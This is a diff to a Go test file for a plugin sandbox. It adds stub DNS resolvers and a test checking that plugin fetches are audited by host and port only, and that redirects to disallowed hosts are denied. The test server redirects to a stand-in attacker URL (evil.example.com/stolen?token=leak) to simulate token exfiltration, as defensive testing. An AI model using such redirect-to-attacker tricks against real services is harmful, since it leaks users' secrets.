@@ -5,6 +5,9 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"net"
+	"net/http"
+	"net/http/httptest"
 	"os"
 	"path/filepath"
 	"strings"
@@ -25,6 +28,9 @@ const stashCtx = `export default function (ctx: any) { (globalThis as any).ctx =
 // startTestPlugin installs, grants and enables a plugin.
 func startTestPlugin(t *testing.T, s *Service, name, perms, code string) {
 	t.Helper()
+	if s.pluginNet.Resolver == nil {
+		s.pluginNet.Resolver = noDNS{} // tests never use real DNS
+	}
 	dir := filepath.Join(t.TempDir(), name)
 	require.NoError(t, os.MkdirAll(dir, 0o700))
 	m := fmt.Sprintf(`{"name":%q,"version":"1.0.0","main":"index.ts","permissions":%s}`, name, perms)
@@ -385,4 +391,58 @@ func flakyGen(t *testing.T, s *Service) uint64 {
 		return rp.gen
 	}
 	return 0
+}
+
+type noDNS struct{}
+
+func (noDNS) LookupIPAddr(_ context.Context, host string) ([]net.IPAddr, error) {
+	return nil, &net.DNSError{Err: "no such host", Name: host, IsNotFound: true}
+}
+
+type mapDNS map[string]string
+
+func (m mapDNS) LookupIPAddr(_ context.Context, host string) ([]net.IPAddr, error) {
+	if ip := net.ParseIP(m[host]); ip != nil {
+		return []net.IPAddr{{IP: ip}}, nil
+	}
+	return nil, &net.DNSError{Err: "no such host", Name: host, IsNotFound: true}
+}
+
+// Every fetch, allowed or denied, writes one audit row with host and port
+// only: no path, no query.
+func TestFetchAudited(t *testing.T) {
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path == "/away" {
+			http.Redirect(w, r, "http://evil.example.com"+r.Host[strings.LastIndexByte(r.Host, ':'):]+"/stolen?token=leak", http.StatusFound)
+			return
+		}
+		fmt.Fprint(w, "ok "+r.UserAgent())
+	}))
+	t.Cleanup(srv.Close)
+	_, port, _ := net.SplitHostPort(srv.Listener.Addr().String())
+	host := "api.example.com:" + port
+
+	s := newMailContextService(t)
+	s.pluginNet = plugins.NetOptions{Resolver: mapDNS{"api.example.com": "127.0.0.1", "evil.example.com": "127.0.0.1"},
+		AllowHTTP: true, AllowLoopback: true}
+	startTestPlugin(t, s, "fetcher", `{"net":["`+host+`"]}`, stashCtx)
+	inv := plugins.Invocation{ID: "call-7", Kind: plugins.KindTool, EgressHosts: []string{host}}
+	got, err := evalPlugin(t, s, "fetcher", inv, `ctx.net.fetch("http://`+host+`/private/path?token=secret").then(r => r.text())`)
+	require.NoError(t, err)
+	assert.Equal(t, "ok Godwit-Plugin/1.0.0", got)
+	_, err = evalPlugin(t, s, "fetcher", inv, `ctx.net.fetch("http://`+host+`/away?token=secret")`)
+	require.ErrorContains(t, err, "host_not_allowed")
+
+	rows, err := s.db.Query(t.Context(), `SELECT source, extension, tool, call_id, destination, decision, COALESCE(reason, '')
+		FROM audit_log WHERE tool LIKE '%net.fetch' ORDER BY id`)
+	require.NoError(t, err)
+	assert.Equal(t, [][]any{
+		{"plugin", "fetcher", "plugin:fetcher:net.fetch", "call-7", host, "allow", ""},
+		{"plugin", "fetcher", "plugin:fetcher:net.fetch", "call-7", host, "deny", "host_not_allowed"},
+	}, rows.Values)
+	all, err := s.db.Query(t.Context(), "SELECT * FROM audit_log")
+	require.NoError(t, err)
+	for _, v := range []string{"/private", "token", "secret", "stolen", "leak", "?"} {
+		assert.NotContains(t, fmt.Sprint(all.Values), v)
+	}
 }
